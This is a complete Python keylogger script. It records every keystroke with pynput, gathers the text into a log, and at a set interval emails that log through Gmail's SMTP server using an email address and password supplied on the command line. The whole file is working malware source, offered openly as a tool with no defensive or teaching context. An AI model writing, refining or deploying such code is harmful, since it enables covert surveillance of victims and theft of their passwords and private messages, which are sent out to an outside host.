#!/usr/bin/env python
import optparse
import smtplib
import pynput.keyboard
import threading


# this script sends key logs to an email in a specified time duration. The time duration input is in second

def getInput():
    parser = optparse.OptionParser(usage="Usage: keylogger [-e] [email] [-p] [password] [-t] [time]\nUsage Example:\t "
                                         "keylogger -e email@gmail.com -p Password12 -t 1800")
    parser.add_option("-e", "--email", dest="email", help="Specify email")
    parser.add_option("-p", "--password", dest="pwd", help="Specify Password")
    parser.add_option("-t", "--time", dest="time", help="Specify time duration")
    options = parser.parse_args()[0]
    return options


class Keylogger:

    def __init__(self, time_interval, email, password):
        # defining an attribute which is used in every function
        self.log = "Keylogger Started"
        self.interval = time_interval
        self.email = email
        self.password = password

    # appending the log variable each time key is pressed
    def append_to_log(self, string):
        self.log = self.log + string

    def process_key_process(self, key):
        current_key = ""
        try:
            current_key = key.char
        except AttributeError:
            if key == key.space:
                current_key = " "
            # it won't detect shift key
            elif key != key.shift and key != key.shift_r:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key)

    def report_key_logs(self):
        self.send_mail("\n\n" + self.log)
        # print("\n\n" + self.log)
        self.log = "Keylogger Output\n"
        thread = threading.Timer(self.interval, self.report_key_logs)
        thread.start()

    def send_mail(self, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(self.email, self.password)
        server.sendmail(self.email, self.email, message)
        server.close()

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_process)
        with keyboard_listener:
            # starting a separate thread on the main program
            self.report_key_logs()
            # start the keyboard_listener
            keyboard_listener.join()


options = getInput()
if not options.email:
    print("[-] Specify email")
elif not options.pwd:
    print("[-] Specify password")
elif not options.time:
    print("[-] Specify time duration")
else:
    keylogger = Keylogger(int(options.time), options.email, options.pwd)
    keylogger.start()
